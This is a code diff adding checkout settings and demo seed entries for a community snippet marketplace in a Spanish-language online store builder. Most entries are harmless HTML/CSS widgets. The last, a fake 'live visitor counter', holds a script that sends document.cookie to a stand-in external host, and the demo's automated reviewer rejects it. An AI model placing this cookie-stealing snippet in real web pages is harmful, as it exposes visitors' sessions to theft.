@@ -122,3 +122,58 @@ export const seedSettings = {
   password: false,
   staff: [{ name: 'Dueño de la tienda', role: 'Propietario' }],
 };
+
+// Ajustes del checkout (en otras plataformas personalizarlo suele exigir el plan más caro).
+export const defaultCheckout = {
+  whatsapp: '573000000000',
+  whatsappOrder: true,
+  requirePhone: true,
+  orderNotes: true,
+  trustText: 'Pago seguro · Devolución gratis en 30 días · Atención por WhatsApp',
+  thanksText: 'Te escribiremos por WhatsApp para coordinar la entrega.',
+};
+
+const ago = d => { const t = new Date(); t.setDate(t.getDate() - d); return t.toISOString(); };
+
+// Envíos de ejemplo para la comunidad de código (autores ficticios de la demo).
+export const seedCommunity = [
+  {
+    id: 'cc1', name: 'Banner con degradado animado', author: 'Ejemplo de la comunidad', category: 'Destacado', installs: 128, submittedAt: ago(20), status: 'aprobado',
+    review: { by: 'Equipo Nexlora', note: 'Limpio, solo CSS. Aprobado.', at: ago(18) },
+    description: 'Un banner llamativo con un degradado que se mueve suavemente. Usa los colores de tu tema.',
+    height: 260,
+    html: '<section class="b"><p class="k">Edición limitada</p><h2>Nueva cosecha disponible</h2><p>Solo 200 bolsas este mes.</p></section>',
+    css: '.b{height:260px;display:grid;place-content:center;text-align:center;color:#fff;padding:24px;background:linear-gradient(120deg,var(--primario),var(--acento),var(--primario));background-size:300% 300%;animation:m 8s ease infinite;border-radius:var(--radio)}.b h2{font-family:var(--fuente-titulos);font-size:clamp(26px,5vw,44px);margin:6px 0}.b p{margin:0;opacity:.9}.k{text-transform:uppercase;letter-spacing:.2em;font-size:12px}@keyframes m{0%{background-position:0 50%}50%{background-position:100% 50%}100%{background-position:0 50%}}',
+  },
+  {
+    id: 'cc2', name: 'Tabla comparativa', author: 'Ejemplo de la comunidad', category: 'Productos', installs: 64, submittedAt: ago(15), status: 'aprobado',
+    review: { by: 'Equipo Nexlora', note: 'Accesible y responsive. Aprobado.', at: ago(14) },
+    description: 'Compara tu producto con "los demás" en una tabla clara. Ideal para landing pages.',
+    height: 330,
+    html: '<div class="t"><h3>¿Por qué nosotros?</h3><table><tr><th></th><th>Nosotros</th><th>Otros</th></tr><tr><td>Tostado reciente</td><td>✔</td><td>✘</td></tr><tr><td>Origen trazable</td><td>✔</td><td>✘</td></tr><tr><td>Envío 24-48 h</td><td>✔</td><td>✔</td></tr><tr><td>Precio justo al productor</td><td>✔</td><td>✘</td></tr></table></div>',
+    css: '.t{max-width:640px;margin:0 auto;padding:16px}.t h3{font-family:var(--fuente-titulos);text-align:center;font-size:28px;margin:0 0 16px}table{width:100%;border-collapse:collapse;background:var(--superficie);border-radius:var(--radio);overflow:hidden}th,td{padding:12px 14px;text-align:center;border-bottom:1px solid rgba(127,127,127,.18)}td:first-child,th:first-child{text-align:left}th:nth-child(2),td:nth-child(2){color:var(--primario);font-weight:700}',
+  },
+  {
+    id: 'cc3', name: 'Sello de garantía', author: 'Ejemplo de la comunidad', category: 'Confianza', installs: 41, submittedAt: ago(9), status: 'aprobado',
+    review: { by: 'Equipo Nexlora', note: 'Aprobado.', at: ago(8) },
+    description: 'Tres sellos de confianza en fila: pago seguro, devolución y garantía.',
+    height: 170,
+    html: '<div class="s"><div><b>🔒</b><span>Pago 100% seguro</span></div><div><b>↩</b><span>30 días de devolución</span></div><div><b>★</b><span>Garantía de frescura</span></div></div>',
+    css: '.s{display:flex;flex-wrap:wrap;gap:12px;justify-content:center;padding:20px}.s div{flex:1 1 150px;max-width:220px;background:var(--superficie);border:2px dashed var(--acento);border-radius:var(--radio);padding:16px;text-align:center}.s b{display:block;font-size:26px;color:var(--primario)}.s span{font-size:14px}',
+  },
+  {
+    id: 'cc4', name: 'Aviso flotante de descuento', author: 'Ejemplo de la comunidad', category: 'Marketing', installs: 0, submittedAt: ago(1), status: 'pendiente', review: null,
+    description: 'Una cinta fija abajo de la pantalla con un código de descuento.',
+    height: 120,
+    html: '<div class="f">Usa <b>BIENVENIDA10</b> y ahorra 10% en tu primera compra</div>',
+    css: '.f{position:fixed;left:12px;right:12px;bottom:12px;background:var(--texto);color:var(--fondo);padding:14px;border-radius:var(--radio);text-align:center}',
+  },
+  {
+    id: 'cc5', name: 'Contador de visitas en vivo', author: 'Ejemplo de la comunidad', category: 'Marketing', installs: 0, submittedAt: ago(3), status: 'rechazado',
+    review: { by: 'Revisor automático', note: 'Rechazado: usa <script> y envía datos a un servidor externo.', at: ago(3) },
+    description: 'Muestra cuánta gente está viendo el producto.',
+    height: 120,
+    html: '<div id="c">12 personas viendo esto</div><script>fetch("http://otro-sitio.example/track?c="+document.cookie)</script>',
+    css: '#c{padding:12px;text-align:center}',
+  },
+];
